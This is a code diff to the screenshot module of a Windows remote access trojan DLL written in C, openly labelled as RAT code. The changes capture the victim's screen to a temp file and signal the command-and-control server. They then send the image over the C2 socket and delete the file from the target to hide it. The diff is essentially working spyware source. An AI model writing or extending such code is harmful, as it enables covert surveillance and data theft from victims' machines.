@@ -10,7 +10,7 @@
 
 /** This function will perform a screenshot for us 
 params:
-* clientSock - current socket connection with out C2
+* clientSock - current socket connection with our C2
 return:
 * if successful we return SUCCESS; otherwise print error code and handle appropiately
 */
@@ -25,6 +25,7 @@ INT performScreenshot(SOCKET clientSock)
 	BITMAPFILEHEADER   bmfHeader;
 	BITMAPINFOHEADER   bi;
 	DWORD dwBmpSize, dwSizeOfDIB, dwBytesWritten, dwBufferSize = 0;
+	LPCSTR fileName = "C:\\Windows\\Temp\\d3adb33f.bmp";
 	char* lpbitmap = NULL, **fileBytes = NULL;
 
 	OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Starting screenshot...\n");
@@ -103,7 +104,7 @@ INT performScreenshot(SOCKET clientSock)
 
 	// Write to output file somewhere on disk
 		// TODO: Randomize file path and name? Use system vars to get system root and stuff 
-	hFile = CreateFile(L"C:\\Windows\\Temp\\d3adb33f.bmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	hFile = CreateFileA(fileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hFile == NULL)
 	{
 		OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Failed to create outputfile!\n");
@@ -142,9 +143,29 @@ INT performScreenshot(SOCKET clientSock)
 	// bfType must always be BM for Bitmaps.
 	bmfHeader.bfType = 0x4D42; // BM.
 
-	WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
-	WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
-	WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);
+	status = WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
+	if (status != SUCCESS)
+	{
+		OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Failed to WriteFile! (bitmap file header) \n");
+		status = WSAGetLastError();
+		goto cleanup;
+	}
+
+	status = WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
+	if (status != SUCCESS)
+	{
+		OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Failed to WriteFile! (bitmap info header) \n");
+		status = WSAGetLastError();
+		goto cleanup;
+	}
+	
+	status = WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);
+	if (status != SUCCESS)
+	{
+		OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Failed to WriteFile! (bitmap) \n");
+		status = WSAGetLastError();
+		goto cleanup;
+	}
 
 	// Unlock and Free the DIB from the heap.
 	GlobalUnlock(hDIB);
@@ -155,8 +176,16 @@ INT performScreenshot(SOCKET clientSock)
 
 	OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Wrote screenshot file!\n");
 
-	// Call get file
+	// Send success here so our C2 knows to expect our screenshot...
+	status = sendSuccess(clientSock);
+	if (status != SUCCESS)
+	{
+		sprintf_s(msgBuf, "RAT-Dll-Screenshot::performScreenshot - Failure received from sendSuccess %d\n", status);
+		OutputDebugStringA(msgBuf);
+		goto cleanup;
+	}
 
+	// Do get file so we send back to C2
 	fileBytes = (char**)malloc(sizeof(char*));
 	if (fileBytes == NULL)
 	{
@@ -165,11 +194,12 @@ INT performScreenshot(SOCKET clientSock)
 		goto cleanup;
 	}
 
-	status = performGetFile("C:\\Windows\\Temp\\d3adb33f.bmp", fileBytes, &dwBufferSize);
+	status = performGetFile(fileName, fileBytes, &dwBufferSize);
 	if (status != SUCCESS)
 	{
 		sprintf_s(msgBuf, "RAT-Dll-Screenshot::performScreenshot - Failure received from performGetFile %d\n", status);
 		OutputDebugStringA(msgBuf);
+		goto cleanup;
 	}
 
 	status = send(clientSock, *fileBytes, dwBufferSize, 0);
@@ -188,11 +218,12 @@ INT performScreenshot(SOCKET clientSock)
 	OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Sent file back to C2!\n");
 
 	// Call delete file 
-	status = performDeleteFile((char*)"C:\\Windows\\Temp\\d3adb33f.bmp");
+	status = performDeleteFile((char*)fileName);
 	if (status != SUCCESS)
 	{
 		sprintf_s(msgBuf, "RAT-Dll-Screenshot::performScreenshot - Failure received from performDeleteFile %d\n", status);
 		OutputDebugStringA(msgBuf);
+		goto cleanup;
 	}
 
 	OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Deleted screenshot from target; cleaning up...\n");
